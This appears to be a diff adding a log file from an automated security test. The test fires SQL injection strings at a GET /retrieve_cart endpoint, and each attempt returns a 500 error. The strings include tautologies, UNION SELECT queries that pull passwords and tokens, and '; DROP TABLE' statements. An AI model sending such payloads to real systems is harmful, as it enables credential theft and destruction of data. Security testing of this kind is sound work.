@@ -1,0 +1,16 @@
+2025-05-01 04:54:24,698 - 144183d33489fc25bf75618f8de4c20f5529d3ee1de6e381d701daa4ef12c816 - INFO - Trying SQL injection vector user1@example.com' OR '1'='1
+2025-05-01 04:54:24,702 - 144183d33489fc25bf75618f8de4c20f5529d3ee1de6e381d701daa4ef12c816 - WARNING - GET /retrieve_cart failed with SQL injection vector user1@example.com' OR '1'='1: 500 Internal Server Error
+2025-05-01 04:54:24,702 - 144183d33489fc25bf75618f8de4c20f5529d3ee1de6e381d701daa4ef12c816 - INFO - Trying SQL injection vector 1 OR '1'='1'
+2025-05-01 04:54:24,707 - 144183d33489fc25bf75618f8de4c20f5529d3ee1de6e381d701daa4ef12c816 - WARNING - GET /retrieve_cart failed with SQL injection vector 1 OR '1'='1': 500 Internal Server Error
+2025-05-01 04:54:24,707 - 144183d33489fc25bf75618f8de4c20f5529d3ee1de6e381d701daa4ef12c816 - INFO - Trying SQL injection vector admin'--
+2025-05-01 04:54:24,710 - 144183d33489fc25bf75618f8de4c20f5529d3ee1de6e381d701daa4ef12c816 - WARNING - GET /retrieve_cart failed with SQL injection vector admin'--: 500 Internal Server Error
+2025-05-01 04:54:24,710 - 144183d33489fc25bf75618f8de4c20f5529d3ee1de6e381d701daa4ef12c816 - INFO - Trying SQL injection vector user2@example.com' UNION SELECT password FROM users --
+2025-05-01 04:54:24,714 - 144183d33489fc25bf75618f8de4c20f5529d3ee1de6e381d701daa4ef12c816 - WARNING - GET /retrieve_cart failed with SQL injection vector user2@example.com' UNION SELECT password FROM users --: 500 Internal Server Error
+2025-05-01 04:54:24,714 - 144183d33489fc25bf75618f8de4c20f5529d3ee1de6e381d701daa4ef12c816 - INFO - Trying SQL injection vector user2@example.com' UNION SELECT token FROM services --
+2025-05-01 04:54:24,728 - 144183d33489fc25bf75618f8de4c20f5529d3ee1de6e381d701daa4ef12c816 - WARNING - GET /retrieve_cart failed with SQL injection vector user2@example.com' UNION SELECT token FROM services --: 500 Internal Server Error
+2025-05-01 04:54:24,728 - 144183d33489fc25bf75618f8de4c20f5529d3ee1de6e381d701daa4ef12c816 - INFO - Trying SQL injection vector anything" OR ""="
+2025-05-01 04:54:24,732 - 144183d33489fc25bf75618f8de4c20f5529d3ee1de6e381d701daa4ef12c816 - WARNING - GET /retrieve_cart failed with SQL injection vector anything" OR ""=": 500 Internal Server Error
+2025-05-01 04:54:24,732 - 144183d33489fc25bf75618f8de4c20f5529d3ee1de6e381d701daa4ef12c816 - INFO - Trying SQL injection vector '; DROP TABLE users; --
+2025-05-01 04:54:24,735 - 144183d33489fc25bf75618f8de4c20f5529d3ee1de6e381d701daa4ef12c816 - WARNING - GET /retrieve_cart failed with SQL injection vector '; DROP TABLE users; --: 500 Internal Server Error
+2025-05-01 04:54:24,735 - 144183d33489fc25bf75618f8de4c20f5529d3ee1de6e381d701daa4ef12c816 - INFO - Trying SQL injection vector '; DROP TABLE services; --
+2025-05-01 04:54:24,738 - 144183d33489fc25bf75618f8de4c20f5529d3ee1de6e381d701daa4ef12c816 - WARNING - GET /retrieve_cart failed with SQL injection vector '; DROP TABLE services; --: 500 Internal Server Error
